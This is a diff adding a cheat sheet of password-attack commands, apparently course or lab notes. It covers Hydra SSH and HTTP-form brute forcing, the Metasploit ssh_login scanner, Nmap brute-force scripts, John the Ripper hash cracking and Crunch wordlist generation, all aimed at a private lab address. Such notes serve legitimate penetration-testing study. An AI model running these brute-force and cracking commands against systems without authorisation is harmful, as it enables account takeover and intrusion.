@@ -1,0 +1,54 @@
+==============================
+🔐 SYSTEM HACKING - PASSWORD ATTACK
+COMMANDS USED
+==============================
+
+------------------------------------
+🛠️ 1. Hydra (Brute-Force Attack)
+------------------------------------
+# Brute-force SSH login using a username and password list
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
+
+# Brute-force HTTP login form
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Incorrect"
+
+------------------------------------
+🛠️ 2. Metasploit Auxiliary Modules (Vulnerability Scanning)
+------------------------------------
+# Launch Metasploit Framework
+msfconsole
+
+# Search and use an auxiliary scanner
+search ssh
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.1.100
+set USER_FILE users.txt
+set PASS_FILE passwords.txt
+run
+
+------------------------------------
+🛠️ 3. Nmap NSE Scripts (Automated Brute-Force)
+------------------------------------
+# Run brute-force script on SSH
+nmap -p 22 --script ssh-brute 192.168.1.100
+
+# Run brute-force script on HTTP login
+nmap -p 80 --script http-brute 192.168.1.100
+
+------------------------------------
+🛠️ 4. John the Ripper (Cracking Hashed Passwords)
+------------------------------------
+# Run john to crack a hashed password file
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Show cracked passwords
+john --show hash.txt
+
+------------------------------------
+🛠️ 5. Crunch (Custom Wordlist Generation)
+------------------------------------
+# Generate a wordlist with all 6-character passwords (lowercase only)
+crunch 6 6 abcdefghijklmnopqrstuvwxyz -o customlist.txt
+
+# Combine with Hydra
+hydra -l admin -P customlist.txt ssh://192.168.1.100
